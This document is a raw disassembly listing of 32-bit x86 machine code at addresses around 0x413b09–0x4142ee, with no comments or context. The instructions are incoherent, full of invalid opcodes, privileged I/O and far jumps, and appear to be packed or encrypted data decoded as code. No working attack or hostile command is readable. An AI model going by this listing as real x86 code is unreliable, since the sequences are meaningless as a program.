  413b09:	arpl   WORD PTR [edx-0x3007c498],bp
  413b0f:	sub    ebp,0x7
  413b12:	retf   0x7390
  413b15:	cli    
  413b16:	pop    ss
  413b17:	xchg   edi,eax
  413b18:	inc    edi
  413b19:	iret   
  413b1a:	or     BYTE PTR [edx-0x31d41b98],ch
  413b20:	xchg   ebp,eax
  413b21:	cdq    
  413b22:	push   esp
  413b23:	repz xchg ebp,eax
  413b25:	push   cs
  413b26:	shr    BYTE PTR [edx+0x7e17a8b0],1
  413b2c:	sar    edx,1
  413b2e:	add    edi,DWORD PTR [edx]
  413b30:	jecxz  0x413acd
  413b32:	inc    esi
  413b33:	mov    edi,0xd7e02e02
  413b38:	sti    
  413b39:	xor    eax,0x1552d4b6
  413b3e:	mov    edi,DWORD PTR [edi+0x5f81df9e]
  413b44:	fld    DWORD PTR [ebx]
  413b46:	xchg   edi,eax
  413b47:	sub    ah,BYTE PTR [esi]
  413b49:	pop    esi
  413b4a:	xchg   edi,eax
  413b4b:	inc    ebx
  413b4c:	xlat   BYTE PTR ds:[ebx]
  413b4d:	sbb    bh,BYTE PTR [esi-0x39]
  413b50:	xor    al,BYTE PTR [ebx+0x41]
  413b53:	sar    ch,0xb
  413b56:	mov    bh,0x95
  413b58:	jnp    0x413b1d
  413b5a:	jnp    0x413b92
  413b5c:	(bad)  
  413b5d:	jecxz  0x413af8
  413b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b60:	or     esi,DWORD PTR [edi*8-0x2bdfff5]
  413b67:	pop    ss
  413b68:	int    0x51
  413b6a:	push   bp
  413b6c:	ret    0xb26
  413b6f:	mov    dh,0x2c
  413b71:	dec    edx
  413b72:	xor    al,0x45
  413b74:	dec    ebp
  413b75:	xchg   ebx,eax
  413b76:	fistp  QWORD PTR [eax+0xe85ebb9]
  413b7c:	cs aam 0xa1
  413b7f:	daa    
  413b80:	mov    esi,0x9d309739
  413b85:	cmc    
  413b86:	gs icebp 
  413b88:	cmp    eax,0x48e58491
  413b8d:	jge    0x413bf8
  413b8f:	inc    ebp
  413b90:	cli    
  413b91:	fldenv [ebx+eax*2]
  413b94:	inc    ebp
  413b95:	loop   0x413b34
  413b97:	push   esp
  413b98:	rdmsr  
  413b9a:	add    DWORD PTR [edi],edi
  413b9c:	enter  0x75c,0xe0
  413ba0:	mov    dl,0x88
  413ba2:	mov    eax,ds:0x929758e6
  413ba7:	clc    
  413ba8:	lods   al,BYTE PTR ds:[esi]
  413ba9:	jo     0x413b65
  413bab:	mov    bh,0xcf
  413bad:	mov    dl,BYTE PTR [ebx]
  413baf:	ds mov ecx,0xe07bba02
  413bb5:	je     0x413b9b
  413bb7:	into   
  413bb8:	jae    0x413b72
  413bba:	jnp    0x413bd5
  413bbc:	sti    
  413bbd:	bound  ebx,QWORD PTR [edx+0x53]
  413bc0:	sbb    al,0x7b
  413bc2:	std    
  413bc3:	retf   0xeafc
  413bc6:	mov    dh,0x4f
  413bc8:	inc    eax
  413bc9:	inc    ecx
  413bca:	and    ecx,edx
  413bcc:	cmp    eax,0x28321a2f
  413bd1:	cmc    
  413bd2:	mov    ah,0x5a
  413bd4:	or     eax,0xdd32b47d
  413bd9:	jp     0x413bce
  413bdb:	adc    eax,0x90fee66a
  413be0:	jmp    DWORD PTR cs:[edi]
  413be3:	or     ebp,0xf3e6eb41
  413be9:	loopne 0x413c08
  413beb:	sbb    eax,0xf22a3337
  413bf0:	call   0x2e84:0xe9ead64
  413bf7:	sub    al,0x4c
  413bf9:	ss int3 
  413bfb:	xchg   edx,eax
  413bfc:	out    0x7d,al
  413bfe:	inc    eax
  413bff:	dec    edi
  413c00:	mov    WORD PTR [ebp+0x5ec69f40],fs
  413c06:	mov    ah,0xcf
  413c08:	xor    bl,BYTE PTR [eax+0x1c]
  413c0b:	mov    ds:0x84026950,eax
  413c10:	mov    dh,BYTE PTR [ecx-0x4c]
  413c13:	mov    esp,0xda6054f3
  413c18:	popf   
  413c19:	in     eax,0x8b
  413c1b:	and    eax,0x33a3d12e
  413c20:	pop    ebx
  413c21:	push   ebx
  413c22:	std    
  413c23:	(bad)  
  413c25:	push   es
  413c26:	sahf   
  413c27:	dec    esp
  413c28:	adc    eax,0x5d13ecf6
  413c2d:	test   ecx,edx
  413c2f:	and    eax,0x3524b110
  413c34:	lea    esp,[esi+ecx*8]
  413c37:	lea    ebx,[ebp+0x46ae9266]
  413c3d:	test   BYTE PTR [esi],dl
  413c3f:	and    BYTE PTR [esi+edi*1],ah
  413c42:	ror    DWORD PTR [ebx+0x48],0x14
  413c46:	stos   DWORD PTR es:[edi],eax
  413c47:	push   esi
  413c48:	xchg   BYTE PTR [edx-0x77],bl
  413c4b:	mov    bl,0x81
  413c4d:	adc    BYTE PTR [edx],dh
  413c4f:	sbb    ecx,ecx
  413c51:	aad    0x25
  413c53:	or     eax,0xc0391b2c
  413c58:	sbb    BYTE PTR [ecx-0xd3aee54],0x59
  413c5f:	or     DWORD PTR [edx+0x6d956659],esp
  413c65:	push   eax
  413c66:	mov    WORD PTR [esi+eiz*8],fs
  413c69:	fcomp  st(4)
  413c6b:	and    al,BYTE PTR [ecx-0x56]
  413c6e:	mov    al,0x4
  413c70:	adc    bl,dl
  413c72:	dec    ebx
  413c73:	xchg   ecx,eax
  413c74:	loope  0x413c64
  413c76:	cmp    eax,0x9158ea15
  413c7b:	sahf   
  413c7c:	mov    ds:0x57ac0cf,al
  413c81:	aaa    
  413c82:	in     al,dx
  413c83:	inc    edx
  413c84:	pusha  
  413c85:	shr    DWORD PTR [esi-0xf0ae4eb],1
  413c8b:	and    edi,eax
  413c8d:	jp     0x413cde
  413c8f:	fwait
  413c90:	adc    bl,dh
  413c92:	rol    DWORD PTR [eax-0x61767350],0x5f
  413c99:	sub    al,BYTE PTR [ebx]
  413c9b:	sti    
  413c9c:	adc    al,0x55
  413c9e:	ss jbe 0x413ca8
  413ca1:	jb     0x413ce9
  413ca3:	das    
  413ca4:	sbb    dl,al
  413ca6:	aad    0x46
  413ca8:	stos   BYTE PTR es:[edi],al
  413ca9:	imul   ecx,DWORD PTR [esp+edx*2-0x14],0x1e02c0cf
  413cb1:	sub    BYTE PTR [edx],dh
  413cb3:	mov    BYTE PTR [esi+eax*4],ah
  413cb6:	and    eax,0x346beffb
  413cbb:	in     eax,dx
  413cbc:	mov    ds:0x7eb8894d,al
  413cc1:	mul    dh
  413cc3:	xor    al,0x24
  413cc5:	lea    ebx,[eax]
  413cc7:	std    
  413cc8:	push   ebp
  413cc9:	xchg   esi,eax
  413cca:	cdq    
  413ccb:	cmp    BYTE PTR [edi],ch
  413ccd:	aas    
  413cce:	sbb    eax,0xe924ffe8
  413cd3:	imul   ecx,ebp,0xcd290adb
  413cd9:	mov    al,ds:0x4702a778
  413cde:	adc    ebp,DWORD PTR [eax]
  413ce0:	dec    esi
  413ce1:	pop    ecx
  413ce2:	cli    
  413ce3:	call   0x59a59f6b
  413ce8:	lock fstp DWORD PTR [ebx-0x4138d405]
  413cef:	or     BYTE PTR [eax-0x19],bh
  413cf2:	pop    es
  413cf3:	scas   al,BYTE PTR es:[edi]
  413cf4:	mov    esp,0x78e210e1
  413cf9:	mov    WORD PTR [ecx+0x58],gs
  413cfc:	and    ch,ah
  413cfe:	mov    al,0x2d
  413d00:	jp     0x413ca1
  413d02:	xchg   ebx,eax
  413d03:	loopne 0x413d6f
  413d05:	scas   al,BYTE PTR es:[edi]
  413d06:	xchg   ecx,eax
  413d07:	loope  0x413d04
  413d09:	shr    BYTE PTR [ebp+ecx*2+0x67],0xca
  413d0e:	sub    DWORD PTR [ebp-0x474ee851],ebx
  413d14:	push   esi
  413d15:	push   ebx
  413d16:	into   
  413d17:	xchg   ebx,eax
  413d18:	shl    edx,cl
  413d1a:	cld    
  413d1b:	test   eax,edx
  413d1d:	shl    DWORD PTR [ecx+0x77680d6c],1
  413d23:	inc    esi
  413d24:	mov    ebx,0xb7993d54
  413d29:	(bad)  
  413d2a:	adc    al,0x73
  413d2c:	js     0x413d8c
  413d2e:	cmp    bl,al
  413d30:	dec    BYTE PTR [esi+0x1071ea95]
  413d36:	and    DWORD PTR [edi],edi
  413d38:	dec    esi
  413d39:	xor    al,0xab
  413d3b:	mov    ch,0x9a
  413d3d:	leave  
  413d3e:	or     ebp,ebx
  413d40:	jle    0x413d99
  413d42:	or     edx,0xc11b8f9d
  413d48:	mov    esi,0x11599348
  413d4d:	fnsave [ecx-0x3d541786]
  413d53:	and    ebx,DWORD PTR [edi+0x456df913]
  413d59:	mov    cl,0x63
  413d5b:	test   eax,0x58117cec
  413d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d61:	add    al,0x3e
  413d63:	ret    
  413d64:	ret    
  413d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d66:	mov    dh,0xa5
  413d68:	sub    al,0x15
  413d6a:	sub    al,0xca
  413d6c:	adc    ebp,DWORD PTR [edi+0xb]
  413d6f:	imul   ebx,DWORD PTR [esi-0xba4a193],0x2a078a9a
  413d79:	in     eax,0x11
  413d7b:	call   FWORD PTR [ebp-0x44]
  413d7e:	push   0xf
  413d80:	popf   
  413d81:	jge    0x413d3b
  413d83:	mov    edi,0x6f2585a1
  413d88:	or     ax,0x3af9
  413d8c:	xlat   BYTE PTR ds:[ebx]
  413d8d:	cmp    DWORD PTR [edi+edx*1+0x3793251e],ebx
  413d94:	inc    esi
  413d95:	or     DWORD PTR gs:[ecx+0x5da0e5b5],ecx
  413d9c:	cmp    dh,al
  413d9e:	inc    eax
  413d9f:	stos   DWORD PTR es:[edi],eax
  413da0:	cmp    al,0x12
  413da2:	dec    ebp
  413da3:	dec    edx
  413da4:	inc    ecx
  413da5:	repnz (bad) 
  413da7:	push   eax
  413da8:	push   ecx
  413da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413daa:	pop    ebx
  413dab:	int    0x33
  413dad:	xchg   ecx,eax
  413dae:	jnp    0x413d5a
  413db0:	lock fcomp QWORD PTR [esi]
  413db3:	adc    eax,eax
  413db5:	aam    0x2a
  413db7:	mov    ch,0xc3
  413db9:	push   es
  413dba:	ret    
  413dbb:	das    
  413dbc:	jl     0x413d94
  413dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dbf:	mov    bh,0xbc
  413dc1:	mov    ss,WORD PTR ds:0x40d6135
  413dc7:	es push esi
  413dc9:	repz sub BYTE PTR [edx-0x2de0474e],0xa7
  413dd1:	gs cmp al,0x55
  413dd4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dd6:	add    dl,BYTE PTR [ebx]
  413dd8:	in     eax,0x63
  413dda:	and    al,0xdd
  413ddc:	div    BYTE PTR [ecx]
  413dde:	adc    BYTE PTR [ecx-0x1c9a7a17],bh
  413de4:	add    DWORD PTR [ecx+0x36],0x6f
  413de8:	cld    
  413de9:	lea    ebx,[ecx-0x5]
  413dec:	adc    DWORD PTR [ebx+0x5b],0xbe097482
  413df3:	jnp    0x413dd8
  413df5:	or     BYTE PTR [esp+edx*1],bl
  413df8:	dec    edx
  413df9:	call   0x51ad:0x3735bec0
  413e00:	loope  0x413da1
  413e02:	mov    eax,edx
  413e04:	push   ebp
  413e05:	cmp    eax,0x272c251
  413e0a:	push   eax
  413e0b:	pop    esp
  413e0c:	xor    al,0xca
  413e0e:	and    DWORD PTR [eax],0x52f45b7
  413e14:	jnp    0x413e46
  413e16:	outs   dx,DWORD PTR ds:[esi]
  413e17:	retf   
  413e18:	push   esp
  413e19:	test   eax,0x29730364
  413e1e:	not    BYTE PTR [ecx+eax*4]
  413e21:	sub    al,0xed
  413e23:	mov    ah,0xda
  413e25:	repz and eax,0xc3764ccb
  413e2b:	xchg   ebx,eax
  413e2c:	push   esp
  413e2d:	jbe    0x413dea
  413e2f:	inc    eax
  413e30:	dec    edx
  413e31:	push   cs
  413e32:	mov    ebx,0xafe2ebc5
  413e37:	fptan  
  413e39:	mov    al,0xda
  413e3b:	les    esp,FWORD PTR [eax+0x7e]
  413e3e:	dec    ebp
  413e3f:	repnz test eax,0x75567146
  413e45:	and    eax,0x6cf4de72
  413e4a:	adc    DWORD PTR [esi-0x80],ecx
  413e4d:	jg     0x413df8
  413e4f:	fild   QWORD PTR [eax-0x64]
  413e52:	ret    
  413e53:	outs   dx,DWORD PTR ds:[esi]
  413e54:	lock push eax
  413e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e57:	mov    esi,0x69825c4f
  413e5c:	xchg   ebp,eax
  413e5d:	fdiv   QWORD PTR [eax+0x2b20b4b5]
  413e63:	div    DWORD PTR [ebp-0x165401be]
  413e69:	mov    ebx,0xb50322b0
  413e6e:	(bad)  
  413e70:	mov    edx,ecx
  413e72:	cmp    BYTE PTR [ecx],al
  413e74:	in     eax,dx
  413e75:	in     eax,dx
  413e76:	repnz repnz pusha 
  413e79:	cmp    esi,DWORD PTR [esi-0x6b]
  413e7c:	adc    al,0x2a
  413e7e:	sub    dh,BYTE PTR [ebp+esi*1+0x5c]
  413e82:	sti    
  413e83:	popa   
  413e84:	adc    al,0x8
  413e86:	and    al,0x62
  413e88:	xchg   ebx,eax
  413e89:	jmp    0x413ee8
  413e8b:	cdq    
  413e8c:	jne    0x413e0e
  413e8e:	leave  
  413e8f:	jl     0x413e1c
  413e91:	add    DWORD PTR [ebp-0x150505c1],esp
  413e97:	sbb    BYTE PTR [ecx-0x6a7ccfef],0x13
  413e9e:	mov    esp,0xcf4c76fd
  413ea3:	outs   dx,BYTE PTR ds:[esi]
  413ea4:	test   BYTE PTR [eax-0x38],bl
  413ea7:	fs mov dl,0xb0
  413eaa:	push   0xd9b9e191
  413eaf:	mov    eax,ds:0x4c32291f
  413eb4:	mov    ecx,0xf03aac46
  413eb9:	clc    
  413eba:	and    eax,0x3ef7ea92
  413ebf:	cmp    ah,ch
  413ec1:	rol    DWORD PTR [edx+0x54b962a3],1
  413ec7:	mov    al,0x26
  413ec9:	sbb    al,0xee
  413ecb:	loope  0x413f34
  413ecd:	sub    al,0xfc
  413ecf:	inc    ebx
  413ed0:	mov    bl,0xf8
  413ed2:	sti    
  413ed3:	cmp    edi,DWORD PTR [esi]
  413ed5:	lock test ebx,0x2d280396
  413edc:	shl    DWORD PTR [edi],1
  413ede:	dec    eax
  413edf:	jo     0x413e9a
  413ee1:	xor    edi,edx
  413ee3:	mov    ah,0x2b
  413ee5:	sbb    al,0x22
  413ee7:	fucomip st,st(1)
  413ee9:	add    DWORD PTR [edi],0x6a
  413eec:	repnz sub BYTE PTR [ecx+eax*4+0x16],bh
  413ef1:	cwde   
  413ef2:	push   eax
  413ef3:	push   edx
  413ef4:	mov    edx,0xfef21a74
  413ef9:	sub    eax,ebx
  413efb:	iret   
  413efc:	scas   eax,DWORD PTR es:[edi]
  413efd:	rol    dl,cl
  413eff:	jecxz  0x413f2b
  413f01:	or     ah,BYTE PTR [ecx-0x70788b8b]
  413f07:	mov    ds:0x9a9f64f7,eax
  413f0c:	sub    ebx,DWORD PTR [eax]
  413f0e:	jb     0x413ef4
  413f10:	das    
  413f11:	sahf   
  413f12:	and    ebp,DWORD PTR [ecx+0x75]
  413f15:	jmp    0x3910839c
  413f1a:	mov    DWORD PTR [ebx+eiz*2-0x7ecb84d2],ebx
  413f21:	sbb    BYTE PTR [ebx+0x3e86e0c1],0x6a
  413f28:	scas   eax,DWORD PTR es:[edi]
  413f29:	cli    
  413f2a:	cs cmc 
  413f2c:	mov    edx,0x341d6687
  413f31:	test   al,0xa3
  413f33:	test   BYTE PTR [esi-0x68f44a57],ch
  413f39:	out    dx,eax
  413f3a:	(bad)  
  413f3b:	clc    
  413f3c:	or     dl,bl
  413f3e:	adc    bl,BYTE PTR [edi-0x14d30771]
  413f44:	inc    ebx
  413f45:	mov    ebp,0xa5076e4e
  413f4a:	repnz mov edx,0xc47ce664
  413f50:	or     esp,esi
  413f52:	sub    BYTE PTR ds:0xf7d5afa7,bh
  413f58:	sti    
  413f59:	in     al,0xc3
  413f5b:	push   edx
  413f5c:	ds (bad) 
  413f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	cmp    al,0xfb
  413f61:	add    al,BYTE PTR [edi]
  413f63:	pop    ebx
  413f64:	lea    edi,[eax+0xb8e4f95]
  413f6a:	push   esp
  413f6b:	das    
  413f6c:	xor    esi,edi
  413f6e:	pop    es
  413f6f:	jne    0x413f1e
  413f71:	shr    DWORD PTR [edi+0x5d],1
  413f74:	leave  
  413f75:	pop    ebp
  413f76:	fistp  QWORD PTR [eax-0x2038caa5]
  413f7c:	inc    ebx
  413f7d:	xor    DWORD PTR [edx],esi
  413f7f:	(bad)  
  413f80:	pop    edx
  413f81:	dec    edx
  413f82:	shl    DWORD PTR [ecx-0x14],0x7c
  413f86:	mov    bl,0xe2
  413f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f89:	cmp    BYTE PTR ds:0xb18cfbdd,bh
  413f8f:	retf   0x3157
  413f92:	jg     0x413fbd
  413f94:	call   0x911f:0x7591e274
  413f9b:	int3   
  413f9c:	sbb    al,0x2d
  413f9e:	js     0x413fe9
  413fa0:	jle    0x413fa1
  413fa2:	out    dx,al
  413fa3:	sahf   
  413fa4:	mov    bh,0x99
  413fa6:	(bad)  
  413fa7:	adc    eax,edx
  413fa9:	mov    edi,0x32b7a154
  413fae:	xor    al,0x1a
  413fb0:	fwait
  413fb1:	push   edi
  413fb2:	stos   DWORD PTR es:[edi],eax
  413fb3:	repnz xor ebx,DWORD PTR [eax+0x11]
  413fb7:	mov    bh,0xf
  413fb9:	lock and ecx,DWORD PTR [edi]
  413fbc:	dec    ecx
  413fbd:	mov    cl,0xa0
  413fbf:	fstp   TBYTE PTR [esp+ebp*8+0x6c59244b]
  413fc6:	add    ecx,DWORD PTR [edi-0x37]
  413fc9:	mov    ebp,0xa49b0976
  413fce:	sbb    eax,0x916fa7da
  413fd3:	dec    esp
  413fd4:	pop    ss
  413fd5:	fldenv ds:0x3fc33ce8
  413fdb:	lahf   
  413fdc:	iret   
  413fdd:	test   DWORD PTR [esi],edi
  413fdf:	lds    esi,FWORD PTR [ebp+0x589dc3c2]
  413fe5:	mov    bl,0xf7
  413fe7:	imul   ebx,DWORD PTR [ebp+0x4cb5989],0xffffffe0
  413fee:	xlat   BYTE PTR ds:[ebx]
  413fef:	and    eax,0x57af19c1
  413ff4:	mov    dl,0xe2
  413ff6:	or     al,0x62
  413ff8:	je     0x414031
  413ffa:	out    0x0,eax
  413ffc:	ja     0x413ffc
  413ffe:	or     edi,DWORD PTR [ebx-0x7e]
  414001:	inc    ebx
  414002:	jne    0x414033
  414004:	mov    ah,0x8e
  414006:	fcmovnbe st,st(2)
  414008:	jle    0x413fbe
  41400a:	sar    BYTE PTR [esi],1
  41400c:	jge    0x414012
  41400e:	mov    ecx,0x6254c362
  414013:	sbb    ecx,ecx
  414015:	call   0x4d18:0xab6b2232
  41401c:	stc    
  41401d:	and    DWORD PTR [ebx-0x56ebceb7],esi
  414023:	jo     0x413fe1
  414025:	jmp    0x414062
  414027:	jmp    0x1627:0xbec2fab7
  41402e:	and    cl,BYTE PTR [ebp+0x1b]
  414031:	(bad)  
  414032:	sti    
  414033:	lods   al,BYTE PTR ds:[esi]
  414034:	cmp    BYTE PTR [ebp-0x66],dh
  414037:	clc    
  414038:	fst    QWORD PTR [ecx]
  41403a:	into   
  41403b:	adc    al,0xff
  41403d:	ds inc esi
  41403f:	(bad)  
  414040:	dec    ecx
  414041:	mov    esi,0x568d8024
  414046:	adc    DWORD PTR [edx+0x3e5c6d08],eax
  41404c:	les    ecx,FWORD PTR [ecx]
  41404e:	push   ss
  41404f:	xchg   ebp,eax
  414050:	xor    dl,dl
  414052:	std    
  414053:	ja     0xe805e543
  414059:	jmp    0xee409193
  41405e:	rol    BYTE PTR [eax],0x1
  414061:	inc    eax
  414062:	inc    esp
  414063:	dec    eax
  414064:	and    al,bl
  414066:	loop   0x4140a9
  414068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414069:	or     esp,DWORD PTR [ecx+0x62]
  41406c:	adc    esi,ebx
  41406e:	jb     0x4140d2
  414070:	in     al,0xb6
  414072:	out    0xd5,eax
  414074:	call   0x7991:0xaedfd6a1
  41407b:	jmp    0x1bec:0xdbb27f5
  414082:	and    esp,edi
  414084:	and    dl,BYTE PTR [esi-0x7cdee436]
  41408a:	arpl   WORD PTR [esi+0x64],ax
  41408d:	jno    0x4140e2
  41408f:	pop    es
  414090:	or     edi,DWORD PTR [eax]
  414092:	xor    dh,cl
  414094:	int3   
  414095:	enter  0x29c,0x37
  414099:	inc    edx
  41409a:	inc    eax
  41409b:	pop    esp
  41409c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409d:	jmp    0x4140be
  41409f:	jle    0x41404e
  4140a1:	mov    eax,0x91edde0
  4140a6:	pop    ebx
  4140a7:	and    bl,BYTE PTR [ebp+0x16]
  4140aa:	dec    ecx
  4140ab:	ret    
  4140ac:	mov    cl,0xb0
  4140ae:	and    DWORD PTR [esi-0x7a],0x1c191813
  4140b5:	mov    bh,dh
  4140b7:	daa    
  4140b8:	fwait
  4140b9:	mov    bh,0xce
  4140bb:	xchg   edi,eax
  4140bc:	sub    al,0x13
  4140be:	mov    edx,DWORD PTR ds:0xea5644a5
  4140c4:	cmp    DWORD PTR [ebx+0x64fd2a9a],edi
  4140ca:	mov    ds:0x17f2ef8c,al
  4140cf:	aad    0x4
  4140d1:	out    dx,al
  4140d2:	dec    esi
  4140d3:	push   edi
  4140d4:	mov    WORD PTR [edi-0x6b],ss
  4140d7:	xchg   dh,ch
  4140d9:	xor    eax,0xbf0587ca
  4140de:	jae    0x41415b
  4140e0:	xor    eax,0x62620af3
  4140e5:	xchg   ebx,eax
  4140e6:	sti    
  4140e7:	adc    al,0xde
  4140e9:	or     BYTE PTR [ebp+eax*4-0x3ad48124],ch
  4140f0:	sub    al,0xa3
  4140f2:	mov    esp,0x2fd77727
  4140f7:	popf   
  4140f8:	mov    ch,0xbf
  4140fa:	sbb    BYTE PTR [ebp-0x68],ah
  4140fd:	jno    0x41417e
  4140ff:	aad    0x92
  414101:	xor    ebx,esp
  414103:	inc    ecx
  414104:	shr    DWORD PTR [ecx-0x333e1ded],0x48
  41410b:	mov    esp,0x7552b970
  414110:	mov    bl,0x31
  414112:	dec    ecx
  414113:	mov    edx,0x71b9991b
  414118:	cmp    al,0xe8
  41411a:	stos   BYTE PTR es:[edi],al
  41411b:	fstp   DWORD PTR [edi]
  41411d:	std    
  41411e:	cs sti 
  414120:	and    BYTE PTR [edx-0x1c],0xc9
  414124:	inc    edx
  414125:	mov    bl,0x9
  414127:	pushf  
  414128:	fwait
  414129:	inc    edx
  41412a:	jg     0x414128
  41412c:	(bad)
  41412f:	dec    esi
  414130:	jecxz  0x414101
  414132:	push   0xffffffc9
  414134:	sbb    cl,BYTE PTR [eax]
  414136:	or     BYTE PTR [ebx+0xa],dl
  414139:	inc    ebp
  41413a:	xchg   BYTE PTR [ebx-0xb749315],dh
  414140:	and    BYTE PTR [ecx],al
  414142:	add    eax,0x7a471314
  414147:	lods   eax,DWORD PTR ds:[esi]
  414148:	ins    DWORD PTR es:[edi],dx
  414149:	push   0x7ce0373b
  41414e:	cmp    ah,BYTE PTR [esi+0xf]
  414151:	mov    ebp,0x58945161
  414156:	in     al,dx
  414157:	stc    
  414158:	push   esp
  414159:	out    dx,eax
  41415a:	cmp    ebp,ebx
  41415c:	push   edi
  41415d:	out    0xbd,eax
  41415f:	and    bl,BYTE PTR [ecx-0x5b265f60]
  414165:	pop    edx
  414166:	fcmove st,st(3)
  414168:	pop    edi
  414169:	(bad)  
  41416a:	and    dl,dl
  41416c:	inc    esi
  41416d:	fmul   DWORD PTR [edi+0x49dc28fe]
  414173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414174:	push   0x20
  414176:	adc    DWORD PTR [ecx],ecx
  414178:	in     eax,0xdf
  41417a:	jmp    0xe8248d62
  41417f:	mov    esp,0xf9178a88
  414184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414185:	or     al,0xfa
  414187:	dec    esi
  414188:	ds dec ecx
  41418a:	add    esi,DWORD PTR [ebp+0x2d]
  41418d:	imul   ebp,ebx,0x2e664d44
  414193:	xchg   ebp,eax
  414194:	xchg   DWORD PTR [edx+0x4147632d],edi
  41419a:	jl     0x414154
  41419c:	dec    ebx
  41419d:	push   edx
  41419e:	pop    ebp
  41419f:	arpl   bp,ax
  4141a1:	cli    
  4141a2:	test   al,0xb7
  4141a4:	push   ss
  4141a5:	mov    ah,0xf
  4141a7:	ror    dh,cl
  4141a9:	hlt    
  4141aa:	sbb    al,0xc8
  4141ac:	add    ebp,DWORD PTR [ebp-0x5db2a062]
  4141b2:	ds das 
  4141b4:	inc    ecx
  4141b5:	mov    BYTE PTR [edi],bh
  4141b7:	mov    WORD PTR [eax+0x510e93fd],?
  4141bd:	xor    esp,edi
  4141bf:	out    0x4b,eax
  4141c1:	push   0x459e0d08
  4141c6:	xor    dl,BYTE PTR [eax]
  4141c8:	jns    0x4141a8
  4141ca:	push   esi
  4141cb:	idiv   DWORD PTR [edx]
  4141cd:	fisub  WORD PTR [ecx+0x23]
  4141d0:	ja     0x414236
  4141d2:	inc    ebx
  4141d3:	push   es
  4141d4:	jne    0x414250
  4141d6:	shl    BYTE PTR [eax+0x11],1
  4141d9:	(bad)  
  4141da:	loop   0x414191
  4141dc:	in     al,dx
  4141dd:	and    DWORD PTR [eax-0x6cb7f09f],0x679c33e4
  4141e7:	dec    edx
  4141e8:	xor    eax,0x821a6352
  4141ed:	loop   0x4141a3
  4141ef:	dec    ebx
  4141f0:	aam    0xcb
  4141f2:	dec    ebx
  4141f3:	xchg   ebp,eax
  4141f4:	mov    eax,ds:0x86503eea
  4141f9:	push   edx
  4141fa:	push   0x4fd0aeb1
  4141ff:	call   0xf9e4:0x124f1c32
  414206:	adc    DWORD PTR [edx],ebx
  414208:	add    ah,bl
  41420a:	shl    DWORD PTR [eax+0x71],cl
  41420d:	sbb    bh,BYTE PTR [ecx+0x4d]
  414210:	lock stos DWORD PTR es:[edi],eax
  414212:	addr16 jb 0x4141de
  414215:	nop
  414216:	jp     0x414283
  414218:	or     eax,0xe7533897
  41421d:	retf   0x9b3f
  414220:	test   eax,0xd9452f40
  414225:	loop   0x4142a3
  414227:	push   esp
  414228:	mov    BYTE PTR ds:0xb7c5bbd0,ah
  41422e:	mov    esi,0x18eee336
  414233:	outs   dx,DWORD PTR ds:[esi]
  414234:	out    dx,al
  414235:	scas   eax,DWORD PTR es:[edi]
  414236:	fbld   TBYTE PTR [ebx+0x13]
  414239:	jecxz  0x4141f7
  41423b:	pushf  
  41423c:	pop    ds
  41423d:	or     DWORD PTR [edi-0x58394db7],0x54
  414244:	pop    ds
  414245:	sbb    eax,ebx
  414247:	add    BYTE PTR [ebp+0x68151dce],ah
  41424d:	xchg   DWORD PTR [eax],eax
  41424f:	sub    ebp,DWORD PTR [edi*4+0x3469f43]
  414256:	mov    edi,0x7b1b6637
  41425b:	pop    esi
  41425c:	jmp    0x68ef:0x541d4844
  414263:	sub    ah,BYTE PTR [ecx+0x26fed236]
  414269:	es iret 
  41426b:	out    0x34,eax
  41426d:	ins    BYTE PTR es:[edi],dx
  41426e:	leave  
  41426f:	stos   DWORD PTR es:[edi],eax
  414270:	jno    0x414224
  414272:	xor    eax,0xb5c76fc7
  414277:	mov    edx,0x6e622a16
  41427c:	ins    DWORD PTR es:[edi],dx
  41427d:	les    eax,FWORD PTR [edi]
  41427f:	pop    edi
  414281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414282:	xchg   BYTE PTR [ecx+0x34],dl
  414285:	nop
  414286:	test   al,0xb1
  414288:	sbb    DWORD PTR [ebx+eiz*8-0x20],edx
  41428c:	fstp   DWORD PTR [ebx]
  41428e:	xchg   DWORD PTR [edi],eax
  414290:	in     eax,0x35
  414292:	aad    0x3c
  414294:	(bad)  
  414295:	sbb    edx,esi
  414297:	cli    
  414298:	icebp  
  414299:	push   ss
  41429a:	fisub  DWORD PTR [eax]
  41429c:	and    DWORD PTR [ebp-0x6a595242],ebp
  4142a2:	ins    DWORD PTR es:[edi],dx
  4142a3:	imul   esi,DWORD PTR ds:0xc781f34d,0x5529079c
  4142ad:	out    0x4d,eax
  4142af:	stos   BYTE PTR es:[edi],al
  4142b0:	mov    bh,0x2d
  4142b2:	fbstp  TBYTE PTR [edx-0x27]
  4142b5:	ins    DWORD PTR es:[edi],dx
  4142b6:	jae    0x4142bb
  4142b8:	icebp  
  4142b9:	pop    ebx
  4142ba:	fmul   QWORD PTR [edi+0x1676157e]
  4142c0:	push   esp
  4142c1:	xchg   ecx,esi
  4142c3:	and    DWORD PTR [ebp+edx*2-0x29],0xffffffa5
  4142c8:	rcr    DWORD PTR [esi+0x3ca84c36],cl
  4142ce:	stc    
  4142cf:	pusha  
  4142d0:	cmp    DWORD PTR [ebp+0x7199a50a],edi
  4142d6:	int3   
  4142d7:	popa   
  4142d8:	scas   eax,DWORD PTR es:[edi]
  4142d9:	sbb    al,0x6e
  4142db:	or     al,ah
  4142dd:	stos   BYTE PTR es:[edi],al
  4142de:	xrelease xchg BYTE PTR [edx],dh
  4142e1:	push   esp
  4142e2:	xor    BYTE PTR [eax+0x745161cb],ah
  4142e8:	dec    ebx
  4142e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ea:	dec    ebx
  4142eb:	leave  
  4142ec:	loopne 0x41434f
  4142ee:	add    BYTE PTR [eax],cl
